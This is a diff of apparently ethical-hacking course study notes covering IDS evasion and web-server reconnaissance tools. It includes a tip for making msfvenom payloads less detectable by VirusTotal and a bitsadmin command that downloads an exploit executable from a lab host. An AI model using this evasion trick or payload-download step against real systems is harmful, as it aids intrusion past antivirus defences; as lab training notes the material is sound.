@@ -124,4 +124,13 @@ Mod - 12(Evading IDS, HonetBot)
   Lab - 2
     msfvenom --> Change the payload size(4000) in /.../template.c folder then recompile the template as a.exe and create other payload using the created a.exe which makes 
      less detectable by virustotal
-    bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe --> to download exe created on msfvenom and shared via /www/html with powershell. 
+    bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe --> to download exe created on msfvenom and shared via /www/html with powershell.
+Mod - 13(Hacking web server)
+  Lab - 1
+    Ghosteye --> Multiple tools - Clickjacking vulnerable, Nmap, whois/DNS lookup, Link grabber, Ip loc, Traceroute, Crawler + robot.txt.
+    SkipFish --> To scan for security security reconnaissance tool for a website.
+    httprecon(Windows) --> Gain information of the techs used in website like apache version, ngix, Hosted on. Research for vulnerabilities of the version used.
+    IDserve --> To get the exact version of website hosted.
+    netcat, telnet --> banner grabbing, gather information (content type, last modified date, accept ranges, ETag, server information)
+    Use nmap to enumerate directories used, discover the hostnames, HTTP trace, Find for IDS/IPS/WAF
+    uniscan --> to scan the directories in the web server.
